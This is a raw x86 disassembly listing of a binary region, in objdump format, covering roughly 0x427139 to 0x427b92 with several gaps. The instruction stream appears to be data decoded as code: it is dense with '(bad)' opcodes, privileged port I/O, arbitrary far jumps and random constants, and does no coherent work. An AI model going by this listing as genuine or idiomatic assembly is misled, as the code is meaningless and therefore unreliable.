  427139:	cs sti 
  42713b:	cs adc al,0x75
  42713e:	rol    BYTE PTR gs:[edx+ebp*2],cl
  427142:	ja     0x427136
  427144:	pop    eax
  427145:	fucomi st,st(0)
  427147:	adc    edi,esi
  427149:	xlat   BYTE PTR ds:[ebx]
  42714a:	arpl   WORD PTR ds:0xdea8b1b9,di
  427150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427151:	inc    eax
  427152:	cmp    dl,BYTE PTR [eax+0x2d]
  427155:	outs   dx,BYTE PTR ds:[esi]
  427156:	sbb    ebp,DWORD PTR [ecx]
  427158:	jle    0x427131
  42715a:	shl    DWORD PTR ds:0x2dad20f2,cl
  427160:	(bad)  
  427161:	retf   
  427162:	pop    ds
  427163:	pop    ds
  427164:	ss (bad) 
  427167:	imul   ecx,edx,0xffffffae
  42716a:	js     0x427119
  42716c:	stc    
  42716d:	stos   DWORD PTR es:[edi],eax
  42716e:	scas   al,BYTE PTR es:[edi]
  42716f:	stc    
  427170:	jp     0x4271ec
  427172:	test   DWORD PTR [esi-0x56c33b6c],esi
  427178:	scas   al,BYTE PTR es:[edi]
  427179:	xor    esp,esi
  42717b:	sbb    eax,0x7e2a4000
  427180:	lea    edi,[ebp+ebp*8+0x4e]
  427184:	push   esp
  427185:	mov    ds:0x869f279e,eax
  42718a:	sub    ah,al
  42718c:	adc    eax,0x657a1cb5
  427191:	fbld   TBYTE PTR [ecx+edi*4+0x21fe0b03]
  427198:	mov    ds:0x1a2a43d3,eax
  42719d:	imul   ebx,DWORD PTR [ebp-0x16],0xffffff9c
  4271a1:	es mov ecx,0xf0da34ac
  4271a7:	sbb    al,dl
  4271a9:	mov    ds:0xd35d13bb,eax
  4271ae:	pop    ss
  4271af:	mov    ss,WORD PTR [edi-0x334ff028]
	...
  427215:	add    BYTE PTR [esi],bl
  427217:	inc    ecx
  427218:	fdiv   QWORD PTR [edi+ebx*8+0x77eb7ebd]
  42721f:	push   0x7adc0100
  427224:	push   ebp
  427225:	add    BYTE PTR [eax+0x70001a1],cl
  42722b:	add    DWORD PTR [eax],eax
  42722d:	add    BYTE PTR [ebx+esi*4-0x41],cl
  427231:	loope  0x427266
  427233:	adc    al,0xc8
  427235:	es aaa 
  427237:	sub    al,0x8d
  427239:	jns    0x42726c
  42723b:	and    dl,BYTE PTR [ecx+0xf]
  42723e:	cld    
  42723f:	shl    DWORD PTR [ecx-0x5e713914],cl
  427245:	test   DWORD PTR [esi-0x56],esp
  427248:	mov    bh,0x71
  42724a:	aam    0x84
  42724c:	mov    ch,0xbe
  42724e:	xchg   ebp,eax
  42724f:	pop    esp
  427250:	je     0x4271ed
  427252:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427253:	bound  edi,QWORD PTR [ecx-0x1d]
  427256:	(bad)  
  427257:	or     edi,esp
  427259:	mov    cl,0x73
  42725b:	aas    
  42725c:	fs ins BYTE PTR es:[edi],dx
  42725e:	stc    
  42725f:	push   eax
  427260:	pusha  
  427261:	jle    0x42729c
  427263:	shr    BYTE PTR [ecx+edx*2+0x7e],1
  427267:	cli    
  427268:	out    0x2e,eax
  42726a:	push   es
  42726b:	fwait
  42726c:	dec    eax
  42726d:	addr16 pushf 
  42726f:	cmc    
  427270:	cmp    al,0x77
  427272:	(bad)  
  427274:	pop    eax
  427275:	mov    ah,dl
  427277:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427278:	cmc    
  427279:	sbb    al,0x51
  42727b:	push   eax
  42727c:	(bad)  
  42727d:	inc    BYTE PTR [esi-0x53376f71]
  427283:	xor    dl,BYTE PTR [esi+edi*1]
  427286:	push   ds
  427287:	fwait
  427288:	jno    0x427261
  42728a:	neg    BYTE PTR [edx]
  42728c:	loopne 0x4272d5
  42728e:	(bad)  
  42728f:	dec    ecx
  427290:	scas   al,BYTE PTR es:[edi]
  427291:	out    dx,al
  427292:	jbe    0x4272a6
  427294:	add    eax,0xa42380e9
  427299:	popa   
  42729a:	js     0x427315
  42729c:	std    
  42729d:	jne    0x4272a9
  42729f:	fwait
  4272a0:	cwde   
  4272a1:	jge    0x42724a
  4272a3:	ja     0x4272bf
  4272a5:	jmp    0x2eff:0x165aaf37
  4272ac:	ror    cl,0xba
  4272af:	test   BYTE PTR [ebx+edi*2],bh
  4272b2:	sbb    ah,0x42
  4272b5:	push   ss
  4272b6:	rol    DWORD PTR [esi+0x15],cl
  4272b9:	pop    ebx
  4272ba:	mov    ah,al
  4272bc:	pop    esi
  4272bd:	neg    BYTE PTR [eax-0x73]
  4272c0:	jmp    0xe39f:0xf01913e6
  4272c7:	sbb    BYTE PTR [ebx],al
  4272c9:	inc    eax
  4272ca:	dec    ebx
  4272cb:	test   BYTE PTR [ecx-0x875f21a],al
  4272d1:	or     DWORD PTR [esp+ecx*4-0x15],ecx
  4272d5:	ret    
  4272d6:	push   ds
  4272d7:	repnz out 0x10,al
  4272da:	enter  0x4da3,0xe
  4272de:	pusha  
  4272df:	mov    ebx,0x532bff8
  4272e4:	push   edx
  4272e5:	push   ds
  4272e6:	bound  esi,QWORD PTR [ebx]
  4272e8:	dec    ebp
  4272e9:	xor    BYTE PTR [edx],cl
  4272eb:	jnp    0x4272ec
  4272ed:	fwait
  4272ee:	push   ecx
  4272ef:	call   0xdc5bfb48
  4272f4:	dec    bx
  4272f6:	push   eax
  4272f7:	and    esi,DWORD PTR [esi+0x64]
  4272fa:	icebp  
  4272fb:	mov    ss,esp
  4272fd:	or     DWORD PTR [esi],esp
  4272ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427300:	lock das 
  427302:	dec    edi
  427303:	push   edi
  427304:	rcr    BYTE PTR [esi-0x262c7976],0x72
  42730b:	(bad)  [edx]
  42730d:	shr    BYTE PTR [edi],cl
  42730f:	xor    BYTE PTR [eax+0x5234c762],cl
  427315:	mov    edx,0x6c249bf3
  42731a:	mov    ecx,0x4a8db0a7
  42731f:	mov    DWORD PTR [edi-0x731e2528],esi
  427325:	enter  0xa5b3,0x83
  427329:	mov    al,0xa9
  42732b:	lea    esp,[edi-0x7b1136c8]
  427331:	pop    ecx
  427332:	and    cl,dh
  427334:	aas    
	...
  427395:	add    BYTE PTR [edx],dl
  427397:	sbb    eax,0xaf3f8832
  42739c:	mov    edx,0x57f28d9f
  4273a1:	push   esp
  4273a2:	push   esi
  4273a3:	jbe    0x4273cf
  4273a5:	jg     0x427336
  4273a7:	mov    ds:0x1070001,al
  4273ac:	add    BYTE PTR [eax],al
  4273ae:	inc    esp
  4273af:	test   al,0x71
  4273b1:	xchg   edi,eax
  4273b2:	xor    BYTE PTR [esi],cl
  4273b4:	adc    DWORD PTR [ebp-0x17998d44],eax
  4273ba:	and    al,0x5e
  4273bc:	xor    al,0xf9
  4273be:	rcr    DWORD PTR [eax],cl
  4273c0:	pop    edi
  4273c1:	jmp    0xada0:0x2052f255
  4273c8:	cmp    al,bl
  4273ca:	inc    edi
  4273cb:	outs   dx,DWORD PTR ds:[esi]
  4273cc:	xchg   BYTE PTR [edx+ecx*8+0x3da728a9],cl
  4273d3:	or     DWORD PTR ds:0xd9f43044,edx
  4273d9:	clc    
  4273da:	inc    eax
  4273db:	jmp    0x4273fc
  4273dd:	fwait
  4273de:	cmp    al,dh
  4273e0:	jmp    0xc99c0a72
  4273e5:	sbb    ah,ah
  4273e7:	cli    
  4273e8:	push   es
  4273e9:	ss and eax,0xe3f3c8dd
  4273ef:	pop    ss
  4273f0:	test   al,0x20
  4273f2:	stc    
  4273f3:	mov    ah,0x8b
  4273f5:	mov    esp,0xb42ff02d
  4273fa:	dec    edi
  4273fb:	mov    cl,0xe5
  4273fd:	add    ah,al
  4273ff:	(bad)  
  427400:	and    eax,0x30e3fe6e
  427405:	cli    
  427406:	pop    edx
  427407:	int3   
  427408:	mov    esp,0xf9f1896
  42740d:	push   ds
  42740e:	loope  0x4273fe
  427410:	inc    eax
  427411:	or     cl,bh
  427413:	or     DWORD PTR [ebx-0x2e003288],0xa49926fe
  42741d:	fisttp DWORD PTR [esi+0xd3c15b]
  427423:	mov    edx,0x83c5c41d
  427428:	pop    es
  427429:	add    al,0x31
  42742b:	add    eax,0xdc431e08
  427430:	add    BYTE PTR [eax-0x3fe8c0c1],0xdb
  427437:	jae    0x4274b3
  427439:	sub    eax,0xdb0ff81e
  42743e:	stos   BYTE PTR es:[edi],al
  42743f:	xor    al,0xe
  427441:	mov    edi,DWORD PTR [edx+0x6e]
  427444:	and    al,0x82
  427446:	pop    ebp
  427447:	dec    edi
  427448:	ret    0x57ee
  42744b:	and    DWORD PTR [ebx],esi
  42744d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42744e:	dec    ebp
  42744f:	add    al,0xd7
  427451:	jle    0x4273e6
  427453:	(bad)  [esi]
  427455:	dec    ebp
  427456:	sub    dl,BYTE PTR [edx*8-0x4a6734b0]
  42745d:	jp     0x4274bf
  42745f:	shl    DWORD PTR ds:0xbe53d171,1
  427465:	push   0xde3ceb7c
  42746a:	mov    edi,0xe05ebf4f
  42746f:	out    0xb2,al
  427471:	sbb    al,0xee
  427473:	aam    0xd1
  427475:	neg    DWORD PTR [ecx-0x11dd2b03]
  42747b:	xchg   ebp,eax
  42747c:	push   esi
  42747d:	rol    dh,cl
  42747f:	sub    al,0x1a
  427481:	out    dx,eax
  427482:	scas   al,BYTE PTR es:[edi]
  427483:	popa   
  427484:	out    dx,eax
  427485:	xchg   esp,eax
  427486:	outs   dx,DWORD PTR ds:[esi]
  427487:	hlt    
  427488:	in     al,dx
  427489:	ds das 
  42748b:	ror    esi,0xda
  42748e:	daa    
  42748f:	mov    ah,0x37
  427491:	(bad)  
  427492:	lds    ecx,FWORD PTR [ebx]
  427494:	jle    0x427476
  427496:	and    DWORD PTR [ebp+edi*1+0x6a],ecx
  42749a:	mov    ah,0x66
  42749c:	mov    edi,eax
  42749e:	enter  0x94fe,0x50
  4274a2:	loope  0x427447
  4274a4:	fistp  QWORD PTR ds:[ebp-0x6e]
  4274a8:	int    0xb3
  4274aa:	or     DWORD PTR [edx+0x5041e859],edi
  4274b0:	or     cl,dh
  4274b2:	adc    eax,0x899e
	...
  427513:	add    BYTE PTR [eax],al
  427515:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427519:	stos   DWORD PTR es:[edi],eax
  42751a:	hlt    
  42751b:	jmp    0x42759c
  42751d:	jmp    DWORD PTR [ecx+0x13a6f50a]
  427523:	and    ebx,DWORD PTR [eax+0x1a396a0]
  427529:	add    BYTE PTR [edi],al
  42752b:	add    DWORD PTR [eax],eax
  42752d:	add    BYTE PTR [edi-0x154b1e5],ah
  427533:	in     eax,0xac
  427535:	add    esi,ebx
  427537:	imul   esp,DWORD PTR [ecx+0x51a44bf],0x62
  42753e:	jae    0x42752e
  427540:	inc    esp
  427541:	mov    eax,0xf4d5541b
  427546:	dec    esp
  427547:	in     eax,dx
  427548:	inc    eax
  427549:	mov    ah,0xd3
  42754b:	dec    edx
  42754c:	(bad)  
  42754e:	mov    si,0xfea1
  427552:	push   edx
  427553:	mov    eax,0x4861ff68
  427558:	out    0x2c,eax
  42755a:	xor    edi,DWORD PTR [edi-0x639febb3]
  427560:	and    DWORD PTR [ebx-0x22],ebp
  427563:	xchg   ebx,eax
  427564:	dec    edx
  427565:	shr    DWORD PTR [edi-0x563ccb6b],0xc
  42756c:	es push esi
  42756e:	popa   
  42756f:	mov    dh,0xef
  427571:	sbb    DWORD PTR [ebx],ebx
  427573:	jo     0x42751a
  427575:	mov    cl,0x78
  427577:	int    0x9d
  427579:	outs   dx,BYTE PTR gs:[esi]
  42757b:	lea    esi,[ebx+0x3f9db4cd]
  427581:	fadd   DWORD PTR [ecx-0x11]
  427584:	jecxz  0x42750c
  427586:	repz xlat BYTE PTR ds:[ebx]
  427588:	nop
  427589:	pushf  
  42758a:	or     ah,BYTE PTR [edi-0xb]
  42758d:	push   ss
  42758e:	xchg   DWORD PTR [ecx],edx
  427590:	sub    dh,BYTE PTR [edi+0x3dffd895]
  427596:	sub    al,0xab
  427598:	sub    al,0xa8
  42759a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42759b:	cmc    
  42759c:	jmp    0x42758d
  42759e:	sub    al,0x85
  4275a0:	adc    ch,BYTE PTR ds:0x41949dc1
  4275a6:	or     bl,BYTE PTR [edi+0x8b2a0bf]
  4275ac:	cs pop es
  4275ae:	inc    edx
  4275af:	jnp    0x427548
  4275b1:	add    al,0x5f
  4275b3:	test   BYTE PTR [ecx-0x53],ch
  4275b6:	sub    eax,0x9325a690
  4275bb:	pop    ebx
  4275bc:	mov    bh,0xaf
  4275be:	xor    DWORD PTR [esi+0x3],esi
  4275c1:	jbe    0x427612
  4275c3:	aam    0xe9
  4275c5:	scas   al,BYTE PTR es:[edi]
  4275c6:	xchg   esi,eax
  4275c7:	int3   
  4275c8:	dec    ebx
  4275c9:	ret    
  4275ca:	(bad)
  4275cd:	gs retf 
  4275cf:	aam    0x5f
  4275d1:	lock retf 0x2306
  4275d5:	sbb    esp,DWORD PTR [ebx+0x1d7a3ff3]
  4275db:	sbb    al,dl
  4275dd:	inc    ecx
  4275de:	jb     0x4275da
  4275e0:	ror    DWORD PTR [eax-0x419867bd],0x44
  4275e7:	or     dl,ch
  4275e9:	popa   
  4275ea:	std    
  4275eb:	sti    
  4275ec:	push   ss
  4275ed:	mov    eax,0x6268dcb6
  4275f2:	mov    esi,0x78353c8c
  4275f7:	mov    bl,bh
  4275f9:	lods   eax,DWORD PTR ds:[esi]
  4275fa:	sbb    cl,ah
  4275fc:	mov    esp,0xf5ecc6b4
  427601:	retf   0xaa5
  427604:	rol    BYTE PTR [ecx+edi*1],0xfe
  427608:	test   bl,dl
  42760a:	test   DWORD PTR [ebp-0x5034679d],0xde4c571a
  427614:	jnp    0x427603
  427616:	in     al,0xc6
  427618:	xor    DWORD PTR [esi],ebx
  42761a:	ss and al,BYTE PTR es:[edi-0x3a]
  42761f:	add    esi,DWORD PTR [esi-0x1e]
  427622:	stc    
  427623:	and    DWORD PTR [edx-0x2a],0x54d26f3a
  42762a:	dec    esi
  42762b:	and    al,0xd7
  42762d:	ss popa 
  42762f:	inc    esi
  427630:	pop    esp
  427631:	les    esp,FWORD PTR [esi]
  427633:	inc    ebx
  427634:	inc    edx
	...
  427695:	add    BYTE PTR [ecx],al
  427697:	push   esi
  427698:	nop
  427699:	out    dx,al
  42769a:	xlat   BYTE PTR ds:[ebx]
  42769b:	out    dx,al
  42769c:	jg     0x42769d
  42769e:	xchg   edi,eax
  42769f:	in     eax,dx
  4276a0:	imul   ebx,eax,0x7a19ac3a
  4276a6:	popf   
  4276a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4276a8:	add    DWORD PTR [eax],eax
  4276aa:	pop    es
  4276ab:	add    DWORD PTR [eax],eax
  4276ad:	add    BYTE PTR [esp+ebp*1+0x10],dh
  4276b1:	dec    esp
  4276b2:	xchg   esi,eax
  4276b3:	cmc    
  4276b4:	cld    
  4276b5:	(bad)  
  4276b6:	jmp    0xfce3:0x385c2ed5
  4276bd:	test   DWORD PTR [esi-0x27844c40],ecx
  4276c3:	add    bl,BYTE PTR [ebx-0x59]
  4276c6:	repnz dec DWORD PTR [ecx+ebx*1]
  4276ca:	jmp    0x5f96:0x507b4c83
  4276d1:	sub    eax,DWORD PTR [edi-0x66]
  4276d4:	pop    es
  4276d5:	push   0x5d8f2748
  4276da:	test   DWORD PTR [esp+ebx*2+0x2f647db],edx
  4276e1:	xchg   edx,eax
  4276e2:	adc    ch,BYTE PTR [ebx]
  4276e4:	xchg   esp,eax
  4276e5:	push   ss
  4276e6:	icebp  
  4276e7:	in     al,dx
  4276e8:	or     ebx,ebx
  4276ea:	or     bl,cl
  4276ec:	jne    0xcc1aea6a
  4276f2:	or     ch,BYTE PTR [ebx+ecx*8+0x4b239ec7]
  4276f9:	jle    0x427725
  4276fb:	inc    esi
  4276fc:	sub    eax,0x57f5b612
  427701:	and    dh,dl
  427703:	jmp    0x12e1ba32
  427708:	dec    esi
  427709:	(bad)  
  42770a:	cmc    
  42770b:	scas   eax,DWORD PTR es:[edi]
  42770c:	dec    edx
  42770d:	fadd   DWORD PTR [edi+0x11]
  427710:	imul   esp,DWORD PTR [ebx+0x3b815e5],0xd1b0b9a9
  42771a:	and    BYTE PTR [edi+0x5ca0c855],bh
  427720:	fld    TBYTE PTR [edi]
  427722:	nop
  427723:	ins    DWORD PTR es:[edi],dx
  427724:	mov    ch,0x24
  427726:	sub    ecx,DWORD PTR [edi+eax*2+0x61]
  42772a:	mov    ds:0xfb381796,eax
  42772f:	test   eax,0x42b04c2f
  427734:	adc    BYTE PTR [edx-0x41ca07ed],bh
  42773a:	jge    0x4276f1
  42773c:	js     0x427731
  42773e:	test   ebx,esi
  427740:	popa   
  427741:	loopne 0x4276f8
  427743:	loope  0x427701
  427745:	addr16 fwait
  427747:	dec    edx
  427748:	mov    eax,0xa39932d9
  42774d:	pop    ds
  42774e:	push   ss
  42774f:	push   ebx
  427750:	adc    BYTE PTR [edx-0x75823799],al
  427756:	mov    es,WORD PTR [eax-0x53]
  427759:	inc    ebp
  42775a:	and    esi,DWORD PTR [eax]
  42775c:	fld    QWORD PTR [ebx+ecx*4]
  42775f:	jns    0x427701
  427761:	cs (bad) 
  427763:	cmc    
  427764:	mov    al,ds:0x9b8a5963
  427769:	inc    edx
  42776a:	pop    esp
  42776b:	push   ds
  42776c:	shr    BYTE PTR [ebx],0xca
  42776f:	es push es
  427771:	cmp    BYTE PTR [ebp-0x77],bh
  427774:	mov    ecx,0x67c4d34d
  427779:	adc    al,0x2c
  42777b:	xor    BYTE PTR [ebp+0x44],cl
  42777e:	dec    edx
  42777f:	pop    edi
  427780:	jp     0x4277b3
  427782:	mov    ch,0x40
  427784:	gs aam 0xd4
  427787:	mov    al,ds:0x51fe4bfb
  42778c:	xor    edi,esp
  42778e:	cmp    DWORD PTR [esi+ebp*2+0x3eb37b01],esp
  427795:	cld    
  427796:	mov    dh,0x96
  427798:	test   eax,0xa98d99df
  42779d:	leave  
  42779e:	dec    ecx
  42779f:	std    
  4277a0:	pop    ecx
  4277a1:	pop    es
  4277a2:	jne    0x4277e9
  4277a4:	ret    0x3deb
  4277a7:	ds cwde 
  4277a9:	(bad)  
  4277aa:	dec    edi
  4277ab:	retf   
  4277ac:	mul    bl
  4277ae:	scas   eax,DWORD PTR es:[edi]
  4277af:	jns    0x4277c5
  4277b1:	test   al,0x22
  4277b3:	cld    
  4277b4:	stc    
	...
  427815:	add    BYTE PTR [edx],bl
  427817:	mov    cl,BYTE PTR [ebx]
  427819:	inc    ebp
  42781a:	fwait
  42781b:	lds    ebx,FWORD PTR [esi-0x21]
  42781e:	push   edx
  42781f:	sar    DWORD PTR [edi+eiz*1],1
  427822:	dec    eax
  427823:	push   ebp
  427824:	aad    0x9
  427826:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427827:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427828:	add    DWORD PTR [eax],eax
  42782a:	pop    es
  42782b:	add    DWORD PTR [eax],eax
  42782d:	add    bl,al
  42782f:	repz cmp dl,BYTE PTR [ebx]
  427832:	adc    al,0x65
  427834:	and    eax,DWORD PTR ds:0x978fb4f4
  42783a:	pop    edx
  42783b:	dec    ecx
  42783c:	cmp    bh,0x64
  42783f:	das    
  427840:	test   DWORD PTR [esp+edx*8+0x3d],ecx
  427844:	ret    
  427845:	jge    0x4277d3
  427847:	(bad)  
  427848:	adc    esp,DWORD PTR [edi-0x48]
  42784b:	shr    dl,0x7e
  42784e:	fimul  WORD PTR [ebx-0x74]
  427851:	and    DWORD PTR [edx+ebp*8+0x5a],ebp
  427855:	pop    ss
  427856:	ss mov cl,0xc6
  427859:	dec    esi
  42785a:	xchg   ebp,eax
  42785b:	icebp  
  42785c:	jmp    0x427839
  42785e:	xchg   BYTE PTR [ebp+0x7c54145a],cl
  427864:	sbb    BYTE PTR [esi-0x67],dh
  427867:	nop
  427868:	jne    0x4278b6
  42786a:	dec    ebx
  42786b:	icebp  
  42786c:	call   0xefdf:0x1024f386
  427873:	aaa    
  427874:	mov    ecx,0xe0aa29ef
  427879:	mov    dh,0x82
  42787b:	stos   BYTE PTR es:[edi],al
  42787c:	enter  0xc496,0x34
  427880:	mov    ecx,0x9b6d3aa8
  427885:	mov    ebx,0xb5757352
  42788a:	pusha  
  42788b:	sti    
  42788c:	and    al,0xd
  42788e:	mov    ah,0x4e
  427890:	out    0x53,al
  427892:	rcr    BYTE PTR [ebx],0x9b
  427895:	cli    
  427896:	xor    edi,DWORD PTR [ecx]
  427898:	inc    esp
  427899:	or     DWORD PTR [ebx],edi
  42789b:	mov    esp,0x4356a834
  4278a0:	push   es
  4278a1:	sbb    DWORD PTR [ebx],0xc55cfb45
  4278a7:	nop    DWORD PTR [ebx]
  4278aa:	js     0x427834
  4278ac:	dec    ebp
  4278ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4278ae:	xchg   ebx,eax
  4278af:	mov    ecx,0xe639dc78
  4278b4:	add    eax,0x136be685
  4278b9:	mov    dh,0x9f
  4278bb:	out    dx,eax
  4278bc:	xor    bh,dl
  4278be:	pop    es
  4278bf:	push   ss
  4278c0:	pop    ebp
  4278c1:	ds ds mov bh,dh
  4278c5:	jbe    0x42787a
  4278c7:	sahf   
  4278c8:	adc    DWORD PTR [ebx],edx
  4278ca:	fs pop esi
  4278cc:	cwde   
  4278cd:	loopne 0x4278b3
  4278cf:	jno    0x4278ea
  4278d1:	lock inc eax
  4278d3:	cmp    BYTE PTR [edx],ah
  4278d5:	jno    0x42791a
  4278d7:	ja     0x4278b0
  4278d9:	xchg   esp,eax
  4278da:	mov    ?,WORD PTR [eax+0x2]
  4278dd:	cdq    
  4278de:	push   ecx
  4278df:	jne    0x4278d0
  4278e1:	sbb    al,0xa9
  4278e3:	ins    BYTE PTR es:[edi],dx
  4278e4:	pop    ebx
  4278e5:	add    BYTE PTR [eax+ecx*2-0x2f6c8e65],bh
  4278ec:	push   es
  4278ed:	adc    esp,ebx
  4278ef:	inc    edi
  4278f0:	or     eax,0xe407ea72
  4278f5:	xchg   ecx,eax
  4278f6:	nop
  4278f7:	shl    BYTE PTR [ebx],0xb5
  4278fa:	mov    esi,0x9ccb2a18
  4278ff:	xor    BYTE PTR [edi+0x70],dl
  427902:	add    al,0x94
  427904:	dec    edi
  427905:	cmp    ebp,DWORD PTR [ebx]
  427907:	out    0x17,al
  427909:	xchg   esp,eax
  42790a:	imul   edi,DWORD PTR [ecx],0xffffffdc
  42790d:	dec    esi
  42790e:	push   edi
  42790f:	adc    DWORD PTR [esi+0x4afd5ea5],ecx
  427915:	dec    ebx
  427916:	add    ch,BYTE PTR [ecx-0xc022471]
  42791c:	mov    edi,0xde0f12de
  427921:	pop    esp
  427922:	xor    eax,0x971bad31
  427927:	inc    edx
  427928:	fnstcw WORD PTR [esp+esi*1]
  42792b:	cmc    
  42792c:	pop    eax
  42792d:	jp     0x4278bd
  42792f:	mov    WORD PTR [ebx+0x31],gs
  427932:	cli    
  427933:	in     al,dx
  427934:	add    BYTE PTR cs:[eax],al
	...
  427993:	add    BYTE PTR [eax],al
  427995:	add    BYTE PTR [edx-0x5c0023],bl
  42799b:	mov    ds:0x63e5fdde,eax
  4279a0:	mov    ebx,0x97e39fd0
  4279a5:	(bad)  [ebx+0x70001a6]
  4279ab:	add    DWORD PTR [eax],eax
  4279ad:	add    BYTE PTR ds:0x92b3719e,bh
  4279b3:	test   ebp,ebx
  4279b5:	mov    al,ds:0xe47cc315
  4279ba:	jns    0x427a33
  4279bc:	loop   0x4279d6
  4279be:	and    esi,ebx
  4279c0:	pop    esi
  4279c1:	pop    ecx
  4279c2:	stos   DWORD PTR es:[edi],eax
  4279c3:	mov    ebp,0xb40d5558
  4279c8:	hlt    
  4279c9:	popa   
  4279ca:	cmp    al,bh
  4279cc:	retf   0xbb8d
  4279cf:	cmp    ch,BYTE PTR [ecx-0x4d9ebe4c]
  4279d5:	test   BYTE PTR [ebp-0xa],0x42
  4279d9:	cdq    
  4279da:	adc    ecx,DWORD PTR [ebp+eax*8+0x7]
  4279de:	push   edi
  4279df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4279e0:	pop    eax
  4279e1:	inc    edx
  4279e2:	dec    edi
  4279e3:	jge    0x4279e6
  4279e5:	push   ebp
  4279e6:	and    esi,0x16
  4279e9:	adc    ebp,DWORD PTR [edi]
  4279eb:	push   0xc9a4fb7f
  4279f0:	jle    0x427a0d
  4279f2:	test   DWORD PTR [ebx-0x7ca00072],edx
  4279f8:	adc    eax,0x1316b71b
  4279fd:	mov    edx,0x56114cb6
  427a02:	ins    DWORD PTR es:[edi],dx
  427a03:	(bad)  
  427a04:	pop    edx
  427a05:	daa    
  427a06:	lock mov bl,0x56
  427a09:	outs   dx,BYTE PTR ds:[esi]
  427a0a:	ret    
  427a0b:	pop    esp
  427a0c:	inc    ecx
  427a0d:	sahf   
  427a0e:	int    0x6c
  427a10:	add    eax,0x83075649
  427a15:	inc    edi
  427a16:	inc    edi
  427a17:	mov    bh,0xa8
  427a19:	pop    edi
  427a1a:	inc    esp
  427a1b:	mov    DWORD PTR [esp+esi*4],0xfeb674c3
  427a22:	jae    0xb96e3905
  427a28:	adc    al,0x65
  427a2a:	mov    edx,0x8dff6bbb
  427a2f:	retf   
  427a30:	fst    QWORD PTR [eax-0x6]
  427a33:	mov    ds:0xc89557f8,al
  427a38:	dec    edi
  427a39:	pop    edx
  427a3a:	xchg   BYTE PTR [esi+0x4aacad19],bl
  427a40:	push   ebp
  427a41:	popa   
  427a42:	xor    esi,esp
  427a44:	fild   DWORD PTR [eax+0x6306e025]
  427a4a:	push   edx
  427a4b:	sbb    esi,DWORD PTR [ebp-0x5923699b]
  427a51:	mov    dl,0x75
  427a53:	cdq    
  427a54:	mov    bh,0x7f
  427a56:	ret    0xcbf8
  427a59:	lahf   
  427a5a:	jecxz  0x4279ed
  427a5c:	stos   DWORD PTR es:[edi],eax
  427a5d:	push   ecx
  427a5e:	sub    esi,DWORD PTR [edx-0x4d]
  427a61:	mov    bh,BYTE PTR [ecx]
  427a63:	ficom  WORD PTR [edx]
  427a65:	jmp    0xe4e7:0x33fa14f
  427a6c:	out    0x2f,al
  427a6e:	xchg   esi,eax
  427a6f:	pop    edx
  427a70:	push   cs
  427a71:	mov    edi,0x661667ed
  427a76:	mov    eax,0xd821ae2b
  427a7b:	ins    DWORD PTR es:[edi],dx
  427a7c:	lahf   
  427a7d:	adc    eax,0xfd75830f
  427a82:	mov    ecx,DWORD PTR [edx+0x12475a08]
  427a88:	pop    ss
  427a89:	adc    DWORD PTR [eax+0x44],ebp
  427a8c:	jecxz  0x427ac9
  427a8e:	fcomp  DWORD PTR [edi]
  427a90:	xor    ebx,DWORD PTR [ecx]
  427a92:	(bad)  
  427a94:	mov    bh,0xd0
  427a96:	jo     0x427acd
  427a98:	je     0x427aa5
  427a9a:	cmp    BYTE PTR [bx-0x32b3],0xe3
  427aa0:	into   
  427aa1:	sub    edx,ebp
  427aa3:	cmp    dh,BYTE PTR [esi]
  427aa5:	dec    esi
  427aa6:	mov    ebp,0x68a5b3b9
  427aab:	lahf   
  427aac:	ins    DWORD PTR es:[edi],dx
  427aad:	int3   
  427aae:	sbb    ebx,0x70d45e53
  427ab4:	adc    eax,0x0
	...
  427b15:	add    dl,cl
  427b17:	mov    edx,DWORD PTR [edx+0x7b]
  427b1a:	push   ebx
  427b1b:	sti    
  427b1c:	jmp    0x427ad9
  427b1e:	pop    edx
  427b1f:	dec    eax
  427b20:	pop    edx
  427b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b22:	cli    
  427b23:	leave  
  427b24:	xlat   BYTE PTR ds:[ebx]
  427b25:	das    
  427b26:	mov    dl,0xa7
  427b28:	add    DWORD PTR [eax],eax
  427b2a:	pop    es
  427b2b:	add    DWORD PTR [eax],eax
  427b2d:	add    BYTE PTR [edi+0x5264dff7],dl
  427b33:	out    0x58,eax
  427b35:	push   ebp
  427b36:	xchg   ebx,ecx
  427b38:	ret    0x1e6a
  427b3b:	pop    es
  427b3c:	in     eax,0x69
  427b3e:	jmp    0x64cfb3e8
  427b43:	fld    DWORD PTR [eax+0x40]
  427b46:	xchg   esi,eax
  427b47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b48:	in     al,0xee
  427b4a:	xor    al,0xdf
  427b4c:	fs cmc 
  427b4e:	push   edi
  427b4f:	sbb    DWORD PTR ds:0xcd6952e5,ebp
  427b55:	pop    ss
  427b56:	push   0xffffffe9
  427b58:	add    BYTE PTR [ebx-0x2638878],ch
  427b5e:	push   es
  427b5f:	repnz stos BYTE PTR es:[edi],al
  427b61:	mov    bh,0xc3
  427b63:	call   0x7cae864a
  427b68:	(bad)  
  427b6a:	aam    0x6f
  427b6c:	dec    edi
  427b6d:	in     al,dx
  427b6e:	rol    DWORD PTR [ecx+0x37a69bb1],cl
  427b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b75:	inc    ebx
  427b76:	or     ch,al
  427b78:	shr    DWORD PTR [eax+0x62],cl
  427b7b:	pop    esp
  427b7c:	sbb    al,0xc9
  427b7e:	mov    WORD PTR ds:0x86fe2bbd,gs
  427b84:	sbb    edi,DWORD PTR [esi]
  427b86:	ror    BYTE PTR [edi],0xb1
  427b89:	shl    BYTE PTR [edx],0x9d
  427b8c:	sahf   
  427b8d:	dec    ecx
  427b8e:	push   eax
  427b8f:	in     eax,0x9e
  427b91:	stos   DWORD PTR es:[edi],eax
  427b92:	mov    eax,0x4941d141
